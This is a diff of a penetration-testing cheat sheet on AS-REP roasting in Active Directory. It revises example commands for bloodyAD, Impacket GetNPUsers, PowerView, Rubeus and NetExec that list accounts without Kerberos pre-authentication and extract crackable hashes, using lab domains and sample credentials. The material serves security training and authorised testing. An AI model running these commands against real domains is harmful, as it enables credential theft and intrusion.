@@ -5,18 +5,22 @@
 ## Requirements:
 
 ### Accounts with the attribute 'DONT_REQ_PREAUTH'
-* Linux:
+### Linux:
+* BloodyAD
     ```bash
     bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
     ```
-
-* Windows (Powerview) only:
+* Impacket
+    ```bash
+    Impacket-GetNPusers inlanefreight.local/<username>
+    ```
+### Windows (Powerview) only:
 
     ```ps1
     Get-DomainUser -UACFilter DONT_REQ_PREAUTH
     PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
     ```
-* Windows (Rubeus):
+### Windows (Rubeus):
     ```ps1
     Rubeus.exe asreproast /format:hashcat
     ```
@@ -49,16 +53,20 @@
 ### [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
 
   ```bash
-  $ Impacket-GetNPUsers htb.local/svc-alfresco -no-pass
-  [*] Getting TGT for svc-alfresco
-  $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4
+  # Credentials
+  Impacket-GetNPUsers <domain>/<user> -request
+
+  # Uncredentialed
+  Impacket-GetNPUsers <domain>/ -dc-ip <DC IP> -usersfile <list_of_users.txt> -format hashcat -outputfile <outfilfe> -no-pass # list of users
+  Impacket-GetNPUsers htb.local/svc-alfresco -no-pass # single user
+
 
   # extract hashes
   Impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
   Impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
   ```
 
-### netexec Module
+### NetExec Module
 
   ```bash
   $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
